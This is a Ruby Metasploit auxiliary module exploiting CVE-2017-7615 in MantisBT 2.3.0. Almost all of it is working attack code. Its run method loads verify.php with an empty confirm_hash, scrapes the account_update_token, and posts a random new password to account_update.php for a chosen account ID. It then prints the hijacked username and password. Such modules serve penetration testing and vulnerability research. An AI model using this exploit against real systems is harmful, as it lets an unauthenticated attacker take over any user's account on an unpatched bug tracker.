##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'MantisBT Arbitrary Password Reset',
      'Description'    => %q{
    This module exploits a flaw in the MantisBT password reset workflow
    that allows an unauthenticated user to change any user's password.
    Tested against 2.3.0.
      },
      'References'     =>
        [
          ['CVE', '2017-7615'],
          ['URL', 'https://asciinema.org/a/7s0rzksynoq2zh44m5i1lprou']
        ],
      'Author'         =>
        [
          'VolatileMinds'
        ],
      'License'        => 'VolatileMinds',
      'DisclosureDate' => 'Apr 8 2017'
    ))

    register_options(
      [
        OptString.new("TARGETURI", [true, 'The relative URI', '/']),
        OptInt.new('ACCOUNTID', [true, 'The account ID of the user to change the password for', 1])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'verify.php'),
      'vars_get' => {
        'id' => datastore['ACCOUNTID'],
        'confirm_hash' => ''
      }
    })

    if res.body =~ /<title>MantisBT/
      if res.body =~ /APPLICATION ERROR #1901/
        return Msf::Exploit::CheckCode::Safe
      else
        return Msf::Exploit::CheckCode::Vulnerable
      end
    end
    Msf::Exploit::CheckCode::Safe
  end

  def run
    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path)
    })

    cookie = res.get_cookies

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'verify.php'),
      'vars_get' => {
        'id' => datastore['ACCOUNTID'],
        'confirm_hash' => ''
      },
      'cookie' => cookie
    })

    unless res && res.body
      fail_with(Failure::Unknown, "Server did not respond in an expected way")
    end

    res.body =~ /APPLICATION ERROR #1901/

    if $1
      fail_with(Failure::Unknown, "Server seems patched")
    end

    res.body =~ /Edit Account - (.*?)<\/span><\/legend>/

    username = $1
    print_good("Changing password for user #{username}")

    res.body =~ /account_update_token" value="(.*?)"\/>/
    post = {}
    post['account_update_token'] = $1
    post['verify_user_id'] = datastore['ACCOUNTID']

    password = Rex::Text.rand_text_alpha(8)

    res.body =~ /name="realname" value="(.*?)"\/>/
    post['realname'] = $1
    post['password'] = password
    post['password_confirm'] = password

    res = send_request_cgi({
      'uri' => normalize_uri(target_uri.path, 'account_update.php'),
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => post,
      'cookie' => cookie
    })

    print_good("Please log in with credentials #{username}:#{password}")
  end
end

